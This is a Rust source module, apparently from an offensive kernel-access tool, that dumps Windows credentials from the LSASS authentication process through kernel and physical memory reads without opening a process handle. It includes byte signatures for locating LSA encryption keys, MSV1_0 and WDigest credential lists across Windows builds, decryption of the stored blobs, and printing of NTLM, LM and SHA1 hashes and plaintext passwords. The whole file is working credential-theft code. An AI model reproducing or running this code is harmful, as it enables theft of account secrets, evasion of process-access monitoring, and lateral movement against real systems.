//! Handleless VTL0 authentication-material acquisition through physical memory.

use crate::{
    adapter::{Capabilities, Capability, KernelAdapter},
    bytes::{read_u16, read_u32, read_u64, zero},
    credential_crypto::{self, LsaKeys},
    credential_packages,
    heap::HeapBuffer,
    image_scan::{ImageScanError, SectionImage},
    output::Output,
    process::{ProcessError, ProcessRecord, find_process},
    profiles::{CredentialProfile, find_credential_profile},
    session::{KernelSession, SessionError},
    user_module::{UserModule, UserModuleError, find_module},
    virtual_memory::{ProcessMemory, VirtualMemoryError, valid_user_address},
};
use core::fmt::{self, Write};

const MAX_NAME_CHARS: usize = 256;
const MAX_SEEN: usize = 256;
const MAX_HASHES: usize = 64;
const MAX_HEADS: usize = 64;
const MAX_SESSIONS: usize = 100;
const MAX_CREDENTIAL_LINKS: usize = 20;
const MAX_WDIGEST_LINKS: usize = 200;
const MAX_BLOB_BYTES: usize = 0x1_0000;
const MAX_WDIGEST_BYTES: usize = 0x400;

const MSV_PATTERN_0: &[u8] = &[
    0x45, 0x89, 0x34, 0x24, 0x48, 0x8b, 0xfb, 0x45, 0x85, 0xc0, 0x0f,
];
const MSV_PATTERN_1: &[u8] = &[0x45, 0x89, 0x34, 0x24, 0x8b, 0xfb, 0x45, 0x85, 0xc0, 0x0f];
const MSV_PATTERN_2: &[u8] = &[
    0x45, 0x89, 0x37, 0x49, 0x4c, 0x8b, 0xf7, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x0f,
];
const MSV_PATTERN_22621: &[u8] = &[
    0x45, 0x89, 0x37, 0x4c, 0x8b, 0xf7, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x0f,
];
const MSV_PATTERN_3: &[u8] = &[
    0x45, 0x89, 0x34, 0x24, 0x4c, 0x8b, 0xff, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74,
];
const MSV_PATTERN_4: &[u8] = &[
    0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74,
];
const MSV_PATTERN_5: &[u8] = &[
    0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74,
];
const MSV_PATTERN_6: &[u8] = &[
    0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74,
];
const MSV_PATTERN_7: &[u8] = &[
    0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74,
];

const LSA_PATTERN_A: &[u8] = &[
    0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15,
];
const LSA_PATTERN_B: &[u8] = &[
    0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d,
];
const LSA_PATTERN_C: &[u8] = &[
    0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0x0d,
];

const WDIGEST_PATTERN: &[u8] = &[
    0x48, 0x8b, 0x05, 0, 0, 0, 0, 0x48, 0x8d, 0x2d, 0, 0, 0, 0, 0x48, 0x8d, 0x7b, 0x24, 0x48, 0x3b,
    0xc5,
];
const WDIGEST_MASK: &[u8] = &[
    1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1,
];
const WDIGEST_LEGACY_PATTERN: &[u8] = &[0x48, 0x3b, 0xd9, 0x74];

#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum CredentialAction {
    Read,
}

#[derive(Debug)]
struct CredentialError {
    stage: &'static str,
    code: u32,
}

#[derive(Default)]
struct CredentialStats {
    sessions: usize,
    decrypted: usize,
    msv: usize,
    packages: usize,
    wdigest: usize,
    parse_failures: usize,
    credential_guard: bool,
}

#[derive(Clone, Copy)]
struct MsvSignature {
    pattern: &'static [u8],
    list_displacement: i32,
    count_displacement: i32,
    correction: i32,
    minimum_build: u32,
}

const MSV_SIGNATURES: &[MsvSignature] = &[
    MsvSignature {
        pattern: MSV_PATTERN_0,
        list_displacement: 25,
        count_displacement: -16,
        correction: 34,
        minimum_build: 26200,
    },
    MsvSignature {
        pattern: MSV_PATTERN_1,
        list_displacement: 25,
        count_displacement: -16,
        correction: 34,
        minimum_build: 26200,
    },
    MsvSignature {
        pattern: MSV_PATTERN_2,
        list_displacement: 27,
        count_displacement: -4,
        correction: 0,
        minimum_build: 22631,
    },
    MsvSignature {
        pattern: MSV_PATTERN_22621,
        list_displacement: 27,
        count_displacement: -4,
        correction: 0,
        minimum_build: 22621,
    },
    MsvSignature {
        pattern: MSV_PATTERN_3,
        list_displacement: 24,
        count_displacement: -4,
        correction: 0,
        minimum_build: 20348,
    },
    MsvSignature {
        pattern: MSV_PATTERN_4,
        list_displacement: 23,
        count_displacement: -4,
        correction: 0,
        minimum_build: 18362,
    },
    MsvSignature {
        pattern: MSV_PATTERN_5,
        list_displacement: 23,
        count_displacement: -4,
        correction: 0,
        minimum_build: 17134,
    },
    MsvSignature {
        pattern: MSV_PATTERN_6,
        list_displacement: 23,
        count_displacement: -4,
        correction: 0,
        minimum_build: 15063,
    },
    MsvSignature {
        pattern: MSV_PATTERN_7,
        list_displacement: 16,
        count_displacement: -4,
        correction: 0,
        minimum_build: 10240,
    },
];

#[derive(Clone, Copy)]
struct LsaSignature {
    pattern: &'static [u8],
    iv_displacement: i32,
    des_displacement: i32,
    aes_displacement: i32,
    key_offset: usize,
}

const LSA_SIGNATURES: &[LsaSignature] = &[
    LsaSignature {
        pattern: LSA_PATTERN_A,
        iv_displacement: 71,
        des_displacement: -89,
        aes_displacement: 16,
        key_offset: 0x38,
    },
    LsaSignature {
        pattern: LSA_PATTERN_A,
        iv_displacement: 58,
        des_displacement: -89,
        aes_displacement: 16,
        key_offset: 0x38,
    },
    LsaSignature {
        pattern: LSA_PATTERN_A,
        iv_displacement: 67,
        des_displacement: -89,
        aes_displacement: 16,
        key_offset: 0x38,
    },
    LsaSignature {
        pattern: LSA_PATTERN_A,
        iv_displacement: 61,
        des_displacement: -73,
        aes_displacement: 16,
        key_offset: 0x38,
    },
    LsaSignature {
        pattern: LSA_PATTERN_B,
        iv_displacement: 62,
        des_displacement: -70,
        aes_displacement: 23,
        key_offset: 0x38,
    },
    LsaSignature {
        pattern: LSA_PATTERN_B,
        iv_displacement: 62,
        des_displacement: -70,
        aes_displacement: 23,
        key_offset: 0x28,
    },
    LsaSignature {
        pattern: LSA_PATTERN_B,
        iv_displacement: 58,
        des_displacement: -62,
        aes_displacement: 23,
        key_offset: 0x28,
    },
    LsaSignature {
        pattern: LSA_PATTERN_C,
        iv_displacement: 59,
        des_displacement: -61,
        aes_displacement: 25,
        key_offset: 0x18,
    },
    LsaSignature {
        pattern: LSA_PATTERN_C,
        iv_displacement: 63,
        des_displacement: -69,
        aes_displacement: 25,
        key_offset: 0x18,
    },
];

#[derive(Clone, Copy)]
struct SessionOffsets {
    luid: usize,
    user: usize,
    domain: usize,
    credentials: usize,
}

#[derive(Clone, Copy)]
struct PrimaryOffsets {
    isolated: usize,
    nt_present: usize,
    nt: usize,
    lm: usize,
    sha: usize,
}

struct WideString {
    value: [u16; MAX_NAME_CHARS],
    length: usize,
}

impl WideString {
    const fn empty() -> Self {
        Self {
            value: [0; MAX_NAME_CHARS],
            length: 0,
        }
    }

    fn is_empty(&self) -> bool {
        self.length == 0
    }

    fn ends_with(&self, value: u16) -> bool {
        self.length != 0 && self.value[self.length - 1] == value
    }

    fn display(&self) -> WideDisplay<'_> {
        WideDisplay(&self.value[..self.length])
    }
}

impl Drop for WideString {
    fn drop(&mut self) {
        for value in &mut self.value {
            unsafe { core::ptr::write_volatile(value, 0) };
        }
        self.length = 0;
    }
}

struct WideDisplay<'a>(&'a [u16]);

impl fmt::Display for WideDisplay<'_> {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        for value in self.0 {
            let character = char::from_u32(*value as u32)
                .filter(|value| *value == '\t' || (!value.is_control() && *value != '\u{007f}'));
            formatter.write_char(character.unwrap_or('?'))?;
        }

        Ok(())
    }
}

struct WideBytes<'a>(&'a [u8]);

impl fmt::Display for WideBytes<'_> {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        for bytes in self.0.chunks_exact(2) {
            let value = u16::from_le_bytes([bytes[0], bytes[1]]);

            if value == 0 {
                break;
            }

            let character = char::from_u32(value as u32)
                .filter(|value| *value == '\t' || (!value.is_control() && *value != '\u{007f}'));
            formatter.write_char(character.unwrap_or('?'))?;
        }

        Ok(())
    }
}

struct Hex<'a>(&'a [u8]);

impl fmt::Display for Hex<'_> {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        for byte in self.0 {
            write!(formatter, "{byte:02x}")?;
        }

        Ok(())
    }
}

struct Seen {
    values: [u64; MAX_SEEN],
    count: usize,
}

impl Seen {
    const fn new() -> Self {
        Self {
            values: [0; MAX_SEEN],
            count: 0,
        }
    }

    fn insert(&mut self, value: u64) -> bool {
        if self.values[..self.count].contains(&value) || self.count == self.values.len() {
            return false;
        }

        self.values[self.count] = value;
        self.count += 1;

        true
    }
}

struct SeenHashes {
    values: [[u8; 16]; MAX_HASHES],
    count: usize,
}

impl SeenHashes {
    const fn new() -> Self {
        Self {
            values: [[0; 16]; MAX_HASHES],
            count: 0,
        }
    }

    fn insert(&mut self, value: &[u8]) -> bool {
        if value.len() != 16 || self.count == self.values.len() {
            return false;
        }

        if self.values[..self.count]
            .iter()
            .any(|existing| existing.as_slice() == value)
        {
            return false;
        }

        self.values[self.count].copy_from_slice(value);
        self.count += 1;

        true
    }
}

pub fn run<A: KernelAdapter>(adapter: &mut A, action: CredentialAction, output: &mut Output) {
    let result = match action {
        CredentialAction::Read => read_credentials(adapter, output),
    };

    if let Err(error) = result {
        let _ = writeln!(
            output,
            "[-] Credential action failed at {} (0x{:08x})",
            error.stage, error.code
        );
    }
}

fn read_credentials<A: KernelAdapter>(
    adapter: &mut A,
    output: &mut Output,
) -> Result<(), CredentialError> {
    const REQUIRED: Capabilities =
        Capabilities::from_bits(Capability::KernelRead as u32 | Capability::PhysicalRead as u32);

    output.line("[*] Action: Read VTL0 authentication material through kernel memory");
    let mut session = KernelSession::open(adapter, REQUIRED, 0).map_err(session_error)?;
    let kernel_profile = session.kernel.profile;
    let system_process = session.system_process;
    let (process, walked) = find_process(session.adapter(), kernel_profile, system_process, None)
        .map_err(process_error)?;
    let mut memory =
        ProcessMemory::new(session.adapter(), process.pid as u32).map_err(memory_error)?;
    let (profile, lsasrv) = exact_profile(&mut memory, &process)?;

    let _ = writeln!(
        output,
        "[*] Target  : authentication service pid={} discovered after {} process records",
        process.pid, walked
    );
    let _ = writeln!(output, "[*] Profile : {} exact PE identities", profile.id);
    output.line("[*] Access  : OpenProcess was not used");

    let text = SectionImage::read(lsasrv, b"lsasrv.dll", b".text").map_err(scan_error)?;
    let keys = extract_lsa_keys(&mut memory, lsasrv, &text)?;
    let (list, heads) = resolve_msv_list(&mut memory, lsasrv, profile.build, &text)?;
    let mut stats = CredentialStats::default();
    let mut hashes = SeenHashes::new();
    walk_msv(
        &mut memory,
        list,
        heads,
        profile.build,
        &keys,
        &mut hashes,
        &mut stats,
        output,
    )?;
    read_wdigest(&mut memory, &process, profile, &keys, &mut stats, output)?;
    let packages = credential_packages::read(&mut memory, &process, profile, &keys, output)
        .map_err(|value| error(value.stage, value.code))?;
    stats.decrypted += packages.decrypted;
    stats.packages = packages.entries;

    let _ = writeln!(
        output,
        "[*] Summary : sessions={} decrypted={} msv={} wdigest={} packages={} parse-failures={}",
        stats.sessions,
        stats.decrypted,
        stats.msv,
        stats.wdigest,
        stats.packages,
        stats.parse_failures
    );
    let _ = writeln!(
        output,
        "[*] VBS     : Credential Guard isolation observed={}",
        yes_no(stats.credential_guard)
    );
    let _ = writeln!(
        output,
        "[*] Reads   : snapshot-pages={} target-pages={} physical={} translations={} misses={}",
        memory.snapshot_pages(),
        memory.mapped_pages(),
        memory.reads(),
        memory.translations(),
        memory.misses()
    );
    session.close().map_err(close_error)?;
    output.line("[+] VTL0 credential read complete");

    Ok(())
}

fn exact_profile<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    process: &ProcessRecord,
) -> Result<(&'static CredentialProfile, UserModule), CredentialError> {
    if process.peb == 0 || process.directory_table_base == 0 {
        return Err(error("credential-process-metadata", 13));
    }

    let (lsasrv, _) = find_module(memory, process.peb, b"lsasrv.dll").map_err(module_error)?;
    let (stable, _) = find_module(memory, process.peb, b"lsasrv.dll").map_err(module_error)?;

    if lsasrv != stable {
        return Err(error("credential-lsasrv-stability", 1237));
    }

    let profile = find_credential_profile(
        lsasrv.identity.timestamp,
        lsasrv.identity.checksum,
        lsasrv.identity.image_size,
    )
    .ok_or_else(|| error("credential-exact-profile", 1306))?;

    Ok((profile, lsasrv))
}

fn extract_lsa_keys<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    module: UserModule,
    text: &SectionImage,
) -> Result<LsaKeys, CredentialError> {
    for signature in LSA_SIGNATURES {
        let pattern_rva = match text.find_unique(signature.pattern) {
            Ok(value) => value,
            Err(ImageScanError::PatternNotFound | ImageScanError::PatternNotUnique) => continue,
            Err(error) => return Err(scan_error(error)),
        };
        let (Ok(iv_displacement), Ok(des_displacement), Ok(aes_displacement)) = (
            add_signed(pattern_rva, signature.iv_displacement),
            add_signed(pattern_rva, signature.des_displacement),
            add_signed(pattern_rva, signature.aes_displacement),
        ) else {
            continue;
        };
        let (Ok(iv_rva), Ok(des_rva), Ok(aes_rva)) = (
            text.displacement_target(iv_displacement),
            text.displacement_target(des_displacement),
            text.displacement_target(aes_displacement),
        ) else {
            continue;
        };

        if iv_rva > 0x0100_0000 || des_rva > 0x0100_0000 || aes_rva > 0x0100_0000 {
            continue;
        }

        let mut keys = LsaKeys::empty();

        if memory
            .read(module.base + iv_rva as u64, &mut keys.iv)
            .is_err()
            || !keys.iv.iter().any(|byte| *byte != 0)
        {
            continue;
        }

        if !extract_bcrypt_key(
            memory,
            module.base + aes_rva as u64,
            signature.key_offset,
            &mut keys.aes,
            &mut keys.aes_length,
        ) || !extract_bcrypt_key(
            memory,
            module.base + des_rva as u64,
            signature.key_offset,
            &mut keys.des,
            &mut keys.des_length,
        ) {
            continue;
        }

        if keys.valid() {
            return Ok(keys);
        }
    }

    Err(error("credential-lsa-keys", 1306))
}

fn extract_bcrypt_key<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    pointer_address: u64,
    key_offset: usize,
    output: &mut [u8],
    output_length: &mut usize,
) -> bool {
    let handle = match memory.read_u64(pointer_address) {
        Ok(value) if valid_user_address(value) => value,
        _ => return false,
    };
    let mut handle_bytes = [0_u8; 0x20];

    if memory.read(handle, &mut handle_bytes).is_err() || &handle_bytes[4..8] != b"RUUU" {
        zero(&mut handle_bytes);
        return false;
    }

    let key = read_u64(&handle_bytes, 0x10).unwrap_or(0);
    zero(&mut handle_bytes);

    if !valid_user_address(key) || key_offset + 4 + 0x34 + 16 > 0xa0 {
        return false;
    }

    let mut key_bytes = [0_u8; 0xa0];

    if memory.read(key, &mut key_bytes).is_err() {
        zero(&mut key_bytes);
        return false;
    }

    let count = read_u32(&key_bytes, key_offset).unwrap_or(0) as usize;
    let start = key_offset + 4;
    let copied = if count == 16 && output.len() >= 32 {
        output[..16].copy_from_slice(&key_bytes[start..start + 16]);
        output[16..32].copy_from_slice(&key_bytes[start + 0x34..start + 0x34 + 16]);
        32
    } else if (count == 24 || count == 32)
        && count <= output.len()
        && start + count <= key_bytes.len()
    {
        output[..count].copy_from_slice(&key_bytes[start..start + count]);
        count
    } else {
        0
    };
    zero(&mut key_bytes);
    *output_length = copied;

    copied != 0
}

fn resolve_msv_list<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    module: UserModule,
    build: u32,
    text: &SectionImage,
) -> Result<(u64, usize), CredentialError> {
    for signature in MSV_SIGNATURES {
        if build < signature.minimum_build {
            continue;
        }

        let pattern_rva = match text.find_unique(signature.pattern) {
            Ok(value) => value,
            Err(ImageScanError::PatternNotFound | ImageScanError::PatternNotUnique) => continue,
            Err(error) => return Err(scan_error(error)),
        };
        let Ok(list_displacement) = add_signed(pattern_rva, signature.list_displacement) else {
            continue;
        };
        let Ok(list_rva) = text.displacement_target(list_displacement) else {
            continue;
        };

        if list_rva > 0x0100_0000 {
            continue;
        }

        let mut list = module.base + list_rva as u64;

        if signature.correction != 0 {
            let Ok(correction_rva) = add_signed(pattern_rva, signature.correction) else {
                continue;
            };
            let Ok(correction) = text.read_u32(correction_rva) else {
                continue;
            };
            let Some(corrected) = list.checked_add(correction as u64) else {
                continue;
            };
            list = corrected;
        }

        let head = match memory.read_u64(list) {
            Ok(value) => value,
            Err(_) => continue,
        };

        if !valid_user_address(head) || head == list {
            continue;
        }

        let mut heads = 1_usize;

        if build >= 9200 && signature.count_displacement != 0 {
            let Ok(count_displacement) = add_signed(pattern_rva, signature.count_displacement)
            else {
                continue;
            };
            let Ok(count_rva) = text.displacement_target(count_displacement) else {
                continue;
            };

            if count_rva <= 0x0100_0000 {
                let mut count = [0_u8; 1];

                if memory
                    .read(module.base + count_rva as u64, &mut count)
                    .is_ok()
                    && count[0] != 0
                {
                    heads = core::cmp::min(count[0] as usize, MAX_HEADS);
                }
            }
        }

        return Ok((list, heads));
    }

    Err(error("credential-msv-list", 1306))
}

#[allow(clippy::too_many_arguments)]
fn walk_msv<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    list: u64,
    heads: usize,
    build: u32,
    keys: &LsaKeys,
    hashes: &mut SeenHashes,
    stats: &mut CredentialStats,
    output: &mut Output,
) -> Result<(), CredentialError> {
    let offsets = session_offsets(build);

    for index in 0..heads {
        let head = list
            .checked_add((index * 16) as u64)
            .ok_or_else(|| error("credential-session-head", 534))?;
        let mut current = memory.read_u64(head).map_err(memory_error)?;
        let mut seen = Seen::new();
        let _ = seen.insert(head);

        while current != 0 && current != head && seen.count < MAX_SESSIONS {
            if !valid_user_address(current) || !seen.insert(current) {
                return Err(error("credential-session-list", 13));
            }

            let mut record = [0_u8; 0x200];
            memory.read(current, &mut record).map_err(memory_error)?;
            let next = read_u64(&record, 0).unwrap_or(0);
            let luid = read_u64(&record, offsets.luid).unwrap_or(0);
            let credentials = read_u64(&record, offsets.credentials).unwrap_or(0);
            let user = read_unicode(memory, &record, offsets.user)?;
            let domain = read_unicode(memory, &record, offsets.domain)?;
            stats.sessions += 1;

            if !user.is_empty() && valid_user_address(credentials) {
                walk_credential_links(
                    memory,
                    credentials,
                    build,
                    keys,
                    hashes,
                    stats,
                    output,
                    luid,
                    &user,
                    &domain,
                )?;
            }

            zero(&mut record);

            if next == 0 {
                break;
            }

            current = next;
        }
    }

    Ok(())
}

#[allow(clippy::too_many_arguments)]
fn walk_credential_links<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    first: u64,
    build: u32,
    keys: &LsaKeys,
    hashes: &mut SeenHashes,
    stats: &mut CredentialStats,
    output: &mut Output,
    luid: u64,
    user: &WideString,
    domain: &WideString,
) -> Result<(), CredentialError> {
    let mut current = first;
    let mut seen = Seen::new();

    while current != 0 && seen.count < MAX_CREDENTIAL_LINKS {
        if !valid_user_address(current) || !seen.insert(current) {
            break;
        }

        let mut record = [0_u8; 0x20];
        memory.read(current, &mut record).map_err(memory_error)?;
        let next = read_u64(&record, 0).unwrap_or(0);
        let primary = read_u64(&record, 0x10).unwrap_or(0);
        zero(&mut record);

        if valid_user_address(primary) {
            walk_primary(
                memory, primary, build, keys, hashes, stats, output, luid, user, domain,
            )?;
        }

        if next == first {
            break;
        }

        current = next;
    }

    Ok(())
}

#[allow(clippy::too_many_arguments)]
fn walk_primary<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    first: u64,
    build: u32,
    keys: &LsaKeys,
    hashes: &mut SeenHashes,
    stats: &mut CredentialStats,
    output: &mut Output,
    luid: u64,
    user: &WideString,
    domain: &WideString,
) -> Result<(), CredentialError> {
    let offsets = primary_offsets(build);
    let mut current = first;
    let mut seen = Seen::new();

    while current != 0 && seen.count < MAX_CREDENTIAL_LINKS {
        if !valid_user_address(current) || !seen.insert(current) {
            break;
        }

        let mut record = [0_u8; 0x60];
        memory.read(current, &mut record).map_err(memory_error)?;
        let next = read_u64(&record, 0).unwrap_or(0);
        let package_length = read_u16(&record, 8).unwrap_or(0) as usize;
        let package_pointer = read_u64(&record, 0x10).unwrap_or(0);
        let encrypted_length = read_u16(&record, 0x18).unwrap_or(0) as usize;
        let encrypted_pointer = read_u64(&record, 0x20).unwrap_or(0);
        let primary = package_is_primary(memory, package_pointer, package_length)?;
        zero(&mut record);

        if primary
            && encrypted_length != 0
            && encrypted_length <= MAX_BLOB_BYTES
            && valid_user_address(encrypted_pointer)
        {
            let mut encrypted = HeapBuffer::new(encrypted_length)
                .ok_or_else(|| error("credential-blob-allocation", 8))?;
            memory
                .read(encrypted_pointer, encrypted.as_mut_slice())
                .map_err(memory_error)?;

            match credential_crypto::decrypt(encrypted.as_slice(), keys) {
                Ok(plain) => {
                    stats.decrypted += 1;
                    let bytes = plain.as_slice();
                    let required = core::cmp::max(
                        offsets.sha + 20,
                        core::cmp::max(offsets.nt + 16, offsets.lm + 16),
                    );

                    if bytes.len() > offsets.isolated && bytes[offsets.isolated] != 0 {
                        stats.credential_guard = true;
                    } else if bytes.len() >= required
                        && bytes.get(offsets.nt_present).copied().unwrap_or(0) != 0
                    {
                        if hashes.insert(&bytes[offsets.nt..offsets.nt + 16]) {
                            let _ = writeln!(output, "[+] MSV1_0 credential");
                            let _ = writeln!(output, "    LUID   : 0x{luid:016x}");
                            let _ = writeln!(output, "    User   : {}", user.display());
                            let _ = writeln!(output, "    Domain : {}", domain.display());
                            let _ = writeln!(
                                output,
                                "    NTLM   : {}",
                                Hex(&bytes[offsets.nt..offsets.nt + 16])
                            );
                            let _ = writeln!(
                                output,
                                "    LM     : {}",
                                Hex(&bytes[offsets.lm..offsets.lm + 16])
                            );
                            let _ = writeln!(
                                output,
                                "    SHA1   : {}",
                                Hex(&bytes[offsets.sha..offsets.sha + 20])
                            );
                            stats.msv += 1;
                        }
                    } else {
                        stats.parse_failures += 1;
                    }
                }
                Err(_) => stats.parse_failures += 1,
            }
        }

        if next == first {
            break;
        }

        current = next;
    }

    Ok(())
}

fn package_is_primary<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    pointer: u64,
    length: usize,
) -> Result<bool, CredentialError> {
    if length == 0 || length > 15 || !valid_user_address(pointer) {
        return Ok(false);
    }

    let mut value = [0_u8; 16];
    memory
        .read(pointer, &mut value[..length])
        .map_err(memory_error)?;
    let narrow = length >= 7 && &value[..7] == b"Primary";
    let wide = length >= 14
        && value[..14]
            == [
                b'P', 0, b'r', 0, b'i', 0, b'm', 0, b'a', 0, b'r', 0, b'y', 0,
            ];
    zero(&mut value);

    Ok(narrow || wide)
}

fn read_wdigest<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    process: &ProcessRecord,
    profile: &CredentialProfile,
    keys: &LsaKeys,
    stats: &mut CredentialStats,
    output: &mut Output,
) -> Result<(), CredentialError> {
    if profile.wdigest_list_rva == 0 {
        output.line("[*] WDigest: exact credential-list profile is unavailable for this build");
        return Ok(());
    }

    let (module, _) = find_module(memory, process.peb, b"wdigest.dll").map_err(module_error)?;

    if module.identity.timestamp != profile.wdigest.pe_timestamp
        || module.identity.checksum != profile.wdigest.pe_checksum
        || module.identity.image_size != profile.wdigest.image_size
    {
        return Err(error("credential-wdigest-profile", 1306));
    }

    let text = SectionImage::read(module, b"wdigest.dll", b".text").map_err(scan_error)?;
    let list_rva = resolve_wdigest_list(&text)?;

    if list_rva != profile.wdigest_list_rva {
        return Err(error("credential-wdigest-list-profile", 1306));
    }

    let head = module.base + list_rva as u64;
    let mut links = [0_u8; 16];
    memory.read(head, &mut links).map_err(memory_error)?;
    let mut current = read_u64(&links, 0).unwrap_or(0);
    let last = read_u64(&links, 8).unwrap_or(0);
    zero(&mut links);

    if current == head && last == head {
        output.line("[*] WDigest: credential list is empty");
        return Ok(());
    }

    if !valid_user_address(current) || !valid_user_address(last) {
        return Err(error("credential-wdigest-sentinel", 13));
    }

    let mut seen = Seen::new();
    let mut previous = head;

    while current != head && seen.count < MAX_WDIGEST_LINKS {
        if !valid_user_address(current) || !seen.insert(current) {
            return Err(error("credential-wdigest-list", 13));
        }

        let mut entry = [0_u8; 0x80];
        memory.read(current, &mut entry).map_err(memory_error)?;
        let next = read_u64(&entry, 0).unwrap_or(0);
        let back = read_u64(&entry, 8).unwrap_or(0);

        if back != previous {
            zero(&mut entry);
            return Err(error("credential-wdigest-backlink", 13));
        }

        let user = read_unicode(memory, &entry, 0x30)?;
        let domain = read_unicode(memory, &entry, 0x40)?;
        let secret_length = read_u16(&entry, 0x50).unwrap_or(0) as usize;
        let secret_maximum = read_u16(&entry, 0x52).unwrap_or(0) as usize;
        let secret_pointer = read_u64(&entry, 0x58).unwrap_or(0);
        zero(&mut entry);

        if !user.is_empty()
            && !domain.is_empty()
            && secret_length != 0
            && secret_length <= secret_maximum
            && secret_maximum <= MAX_WDIGEST_BYTES
            && valid_user_address(secret_pointer)
        {
            let mut encrypted = HeapBuffer::new(secret_maximum)
                .ok_or_else(|| error("credential-wdigest-allocation", 8))?;
            memory
                .read(secret_pointer, encrypted.as_mut_slice())
                .map_err(memory_error)?;

            match credential_crypto::decrypt(encrypted.as_slice(), keys) {
                Ok(plain) => {
                    stats.decrypted += 1;
                    let length = core::cmp::min(secret_length, plain.as_slice().len());

                    if length != 0 {
                        let _ = writeln!(output, "[+] WDigest credential");
                        let _ = writeln!(output, "    User     : {}", user.display());
                        let _ = writeln!(output, "    Domain   : {}", domain.display());

                        if user.ends_with(b'$' as u16) {
                            let _ = writeln!(
                                output,
                                "    Secret   : {}",
                                Hex(&plain.as_slice()[..length])
                            );
                        } else {
                            let _ = writeln!(
                                output,
                                "    Password : {}",
                                WideBytes(&plain.as_slice()[..length])
                            );
                        }

                        stats.wdigest += 1;
                    }
                }
                Err(_) => stats.parse_failures += 1,
            }
        }

        previous = current;
        current = next;
    }

    if current != head || previous != last {
        return Err(error("credential-wdigest-closure", 13));
    }

    Ok(())
}

fn resolve_wdigest_list(text: &SectionImage) -> Result<u32, CredentialError> {
    match text.find_unique_masked(WDIGEST_PATTERN, WDIGEST_MASK) {
        Ok(pattern) => return text.displacement_target(pattern + 10).map_err(scan_error),
        Err(ImageScanError::PatternNotFound) => {}
        Err(error) => return Err(scan_error(error)),
    }

    let pattern = text
        .find_unique(WDIGEST_LEGACY_PATTERN)
        .map_err(scan_error)?;
    let displacement = pattern
        .checked_sub(4)
        .ok_or_else(|| error("credential-wdigest-list-profile", 534))?;

    text.displacement_target(displacement).map_err(scan_error)
}

fn read_unicode<A: KernelAdapter>(
    memory: &mut ProcessMemory<'_, A>,
    record: &[u8],
    offset: usize,
) -> Result<WideString, CredentialError> {
    let length = read_u16(record, offset).unwrap_or(0) as usize;
    let maximum = read_u16(record, offset + 2).unwrap_or(0) as usize;
    let pointer = read_u64(record, offset + 8).unwrap_or(0);
    let mut output = WideString::empty();

    if length == 0 || pointer == 0 {
        return Ok(output);
    }

    if length & 1 != 0
        || length > maximum
        || length > (MAX_NAME_CHARS - 1) * 2
        || !valid_user_address(pointer)
    {
        return Err(error("credential-unicode-string", 13));
    }

    let mut bytes = [0_u8; MAX_NAME_CHARS * 2];
    memory
        .read(pointer, &mut bytes[..length])
        .map_err(memory_error)?;
    let count = length / 2;

    for index in 0..count {
        output.value[index] = u16::from_le_bytes([bytes[index * 2], bytes[index * 2 + 1]]);
    }

    output.length = output.value[..count]
        .iter()
        .position(|value| *value == 0)
        .unwrap_or(count);
    zero(&mut bytes);

    Ok(output)
}

const fn session_offsets(build: u32) -> SessionOffsets {
    if build >= 9_600 {
        SessionOffsets {
            luid: 0x70,
            user: 0x90,
            domain: 0xa0,
            credentials: 0x108,
        }
    } else {
        SessionOffsets {
            luid: 0x58,
            user: 0x78,
            domain: 0x88,
            credentials: 0xf0,
        }
    }
}

const fn primary_offsets(build: u32) -> PrimaryOffsets {
    if build >= 26_100 {
        PrimaryOffsets {
            isolated: 0x28,
            nt_present: 0x29,
            nt: 0x46,
            lm: 0x56,
            sha: 0x66,
        }
    } else if build >= 22_000 {
        PrimaryOffsets {
            isolated: 0x28,
            nt_present: 0x29,
            nt: 0x4a,
            lm: 0x5a,
            sha: 0x6a,
        }
    } else if build >= 9_600 {
        PrimaryOffsets {
            isolated: 0x28,
            nt_present: 0x29,
            nt: 0x4a,
            lm: 0x5a,
            sha: 0x36,
        }
    } else {
        PrimaryOffsets {
            isolated: 0x28,
            nt_present: 0x29,
            nt: 0x38,
            lm: 0x48,
            sha: 0x18,
        }
    }
}

fn add_signed(value: u32, displacement: i32) -> Result<u32, CredentialError> {
    let value = value as i64 + displacement as i64;

    if value < 0 || value > u32::MAX as i64 {
        return Err(error("credential-signature-offset", 534));
    }

    Ok(value as u32)
}

const fn error(stage: &'static str, code: u32) -> CredentialError {
    CredentialError { stage, code }
}

const fn session_error(value: SessionError) -> CredentialError {
    error(value.stage, value.code)
}

const fn process_error(value: ProcessError) -> CredentialError {
    error(value.stage(), value.code())
}

const fn memory_error(value: VirtualMemoryError) -> CredentialError {
    error(value.stage(), value.code())
}

